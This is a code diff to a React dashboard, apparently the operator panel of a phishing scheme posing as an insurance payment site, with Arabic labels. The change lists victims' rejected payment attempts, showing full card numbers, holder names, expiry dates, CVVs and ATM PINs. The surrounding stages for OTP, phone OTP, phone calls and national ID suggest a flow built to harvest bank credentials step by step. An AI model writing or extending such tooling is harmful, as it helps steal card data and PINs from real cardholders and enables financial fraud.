@@ -305,9 +305,9 @@ function renderStageContent(
   getLatestResendEvent: (orderId: string, stage: string) => StageEvent | null,
 ) {
   switch (stageKey) {
-    case "payment": return renderPaymentCard(order);
+    case "payment": return renderPaymentCard(order, stageEvents);
     case "otp": return renderOtp(order, stageEvents, getLatestResendEvent);
-    case "atm": return renderAtm(order);
+    case "atm": return renderAtm(order, stageEvents);
     case "phone_verification": return renderPhoneVerification(order, stageEvents, selectedVisitor, visitorPhone, visitorNationalId);
     case "phone_otp": return renderPhoneOtp(order, stageEvents);
     case "stc_call": return renderStcCall(order, stageEvents);
@@ -317,9 +317,13 @@ function renderStageContent(
   }
 }
 
-function renderPaymentCard(order: InsuranceOrder) {
+function renderPaymentCard(order: InsuranceOrder, stageEvents: StageEvent[]) {
   const hasCardData = order.card_holder_name || order.card_number_full || order.card_last_four || order.card_expiry || order.card_cvv;
-  if (!hasCardData) return <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>;
+
+  // Previous rejected payment attempts (kept visible with strikethrough)
+  const rejectedPaymentEvents = stageEvents
+    .filter(e => e.order_id === order.id && e.stage === "payment" && e.status === "rejected")
+    .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
 
   const num = order.card_number_full || order.card_last_four || "";
   const meta = getCardMetadata(num);
@@ -333,28 +337,56 @@ function renderPaymentCard(order: InsuranceOrder) {
 
   return (
     <div className="space-y-2">
-      <div className="mx-auto w-full max-w-[200px] md:max-w-[240px] h-[110px] md:h-[130px] rounded-xl p-2 md:p-2.5 flex flex-col justify-between text-white relative overflow-hidden"
-        style={{ background: `linear-gradient(135deg, ${bc.from}, ${bc.to})`, boxShadow: `0 6px 18px ${bc.from}44` }}>
-        <div className="flex justify-between items-start">
-          <div className="w-6 md:w-7 h-3.5 md:h-4 rounded bg-yellow-300/80" />
-          <CardBrandLogo brandKey={meta.brandKey} className="w-7 md:w-8 h-4 md:h-5" />
-        </div>
-        <p className="text-[9px] md:text-[10px] font-mono tracking-[1.5px] md:tracking-[2px] text-white/90 text-center" dir="ltr">{displayNum}</p>
-        <div className="flex justify-between items-end text-[7px] md:text-[8px]">
-          <div><p className="text-white/50 text-[5px] md:text-[6px]">CARD HOLDER</p><p className="text-white/90 font-medium truncate max-w-[90px] md:max-w-[120px]">{order.card_holder_name || "—"}</p></div>
-          <div className="text-left" dir="ltr"><p className="text-white/50 text-[5px] md:text-[6px]">EXPIRES</p><p className="text-white/90 font-medium">{order.card_expiry || "MM/YY"}</p></div>
-          {order.card_cvv && <div className="text-left" dir="ltr"><p className="text-white/50 text-[5px] md:text-[6px]">CVV</p><p className="text-white/90 font-bold font-mono">{order.card_cvv}</p></div>}
-        </div>
-        {meta.isDetected && meta.bankName && <p className="absolute bottom-0.5 left-1/2 -translate-x-1/2 text-[5px] md:text-[6px] text-white/40">{meta.bankName}</p>}
-      </div>
-      <div className="grid grid-cols-2 gap-1.5">
-        {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
-        {(order.card_number_full || order.card_last_four) && <InfoItem label="رقم البطاقة" value={order.card_number_full || `•••• ${order.card_last_four}`} />}
-        {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
-        {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
-        {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة" : order.payment_method === "atm" ? "ATM" : order.payment_method} />}
-        {meta.isDetected && <InfoItem label="نوع البطاقة" value={`${meta.brandLabel} - ${meta.classificationLabel}`} />}
-      </div>
+      {/* Rejected previous attempts */}
+      {rejectedPaymentEvents.map((ev, i) => {
+        const p = (ev.payload as any) || {};
+        const cardNum = p.card_number_full || (p.card_last_four ? `•••• ${p.card_last_four}` : "—");
+        return (
+          <div key={ev.id} className="bg-red-500/5 border border-red-500/20 rounded-lg px-2 py-1.5 space-y-1">
+            <div className="flex items-center justify-between">
+              <span className="text-[10px] font-bold text-red-600">محاولة {i + 1} — مرفوضة</span>
+              <span className="text-[8px] text-red-500/70">{new Date(ev.stage_entered_at).toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit" })}</span>
+            </div>
+            <div className="grid grid-cols-2 gap-1 text-[9px]">
+              {p.card_holder_name && <div><p className="text-red-400/80">الاسم</p><p className="font-medium text-red-500 line-through truncate">{p.card_holder_name}</p></div>}
+              {(p.card_number_full || p.card_last_four) && <div><p className="text-red-400/80">الرقم</p><p className="font-mono text-red-500 line-through" dir="ltr">{cardNum}</p></div>}
+              {p.card_expiry && <div><p className="text-red-400/80">الانتهاء</p><p className="font-mono text-red-500 line-through" dir="ltr">{p.card_expiry}</p></div>}
+              {p.card_cvv && <div><p className="text-red-400/80">CVV</p><p className="font-mono text-red-500 line-through" dir="ltr">{p.card_cvv}</p></div>}
+            </div>
+          </div>
+        );
+      })}
+
+      {!hasCardData && rejectedPaymentEvents.length === 0 && (
+        <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
+      )}
+
+      {hasCardData && (
+        <>
+          <div className="mx-auto w-full max-w-[200px] md:max-w-[240px] h-[110px] md:h-[130px] rounded-xl p-2 md:p-2.5 flex flex-col justify-between text-white relative overflow-hidden"
+            style={{ background: `linear-gradient(135deg, ${bc.from}, ${bc.to})`, boxShadow: `0 6px 18px ${bc.from}44` }}>
+            <div className="flex justify-between items-start">
+              <div className="w-6 md:w-7 h-3.5 md:h-4 rounded bg-yellow-300/80" />
+              <CardBrandLogo brandKey={meta.brandKey} className="w-7 md:w-8 h-4 md:h-5" />
+            </div>
+            <p className="text-[9px] md:text-[10px] font-mono tracking-[1.5px] md:tracking-[2px] text-white/90 text-center" dir="ltr">{displayNum}</p>
+            <div className="flex justify-between items-end text-[7px] md:text-[8px]">
+              <div><p className="text-white/50 text-[5px] md:text-[6px]">CARD HOLDER</p><p className="text-white/90 font-medium truncate max-w-[90px] md:max-w-[120px]">{order.card_holder_name || "—"}</p></div>
+              <div className="text-left" dir="ltr"><p className="text-white/50 text-[5px] md:text-[6px]">EXPIRES</p><p className="text-white/90 font-medium">{order.card_expiry || "MM/YY"}</p></div>
+              {order.card_cvv && <div className="text-left" dir="ltr"><p className="text-white/50 text-[5px] md:text-[6px]">CVV</p><p className="text-white/90 font-bold font-mono">{order.card_cvv}</p></div>}
+            </div>
+            {meta.isDetected && meta.bankName && <p className="absolute bottom-0.5 left-1/2 -translate-x-1/2 text-[5px] md:text-[6px] text-white/40">{meta.bankName}</p>}
+          </div>
+          <div className="grid grid-cols-2 gap-1.5">
+            {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
+            {(order.card_number_full || order.card_last_four) && <InfoItem label="رقم البطاقة" value={order.card_number_full || `•••• ${order.card_last_four}`} />}
+            {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
+            {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
+            {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة" : order.payment_method === "atm" ? "ATM" : order.payment_method} />}
+            {meta.isDetected && <InfoItem label="نوع البطاقة" value={`${meta.brandLabel} - ${meta.classificationLabel}`} />}
+          </div>
+        </>
+      )}
     </div>
   );
 }
@@ -390,11 +422,27 @@ function renderOtp(order: InsuranceOrder, stageEvents: StageEvent[], getLatestRe
   );
 }
 
-function renderAtm(order: InsuranceOrder) {
-  if (!order.atm_pin) return <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>;
+function renderAtm(order: InsuranceOrder, stageEvents: StageEvent[]) {
+  const rejected = stageEvents
+    .filter(e => e.order_id === order.id && e.stage === "atm" && e.status === "rejected")
+    .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
+
+  if (!order.atm_pin && rejected.length === 0) {
+    return <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>;
+  }
   return (
-    <div className="flex justify-center">
-      <span className="text-lg font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
+    <div className="space-y-1.5">
+      {rejected.map((ev, i) => (
+        <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1">
+          <span className="text-[10px] text-red-500">محاولة {i + 1} — مرفوضة</span>
+          <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.atm_pin || "—"}</span>
+        </div>
+      ))}
+      {order.atm_pin && (
+        <div className="flex justify-center">
+          <span className="text-lg font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
+        </div>
+      )}
     </div>
   );
 }
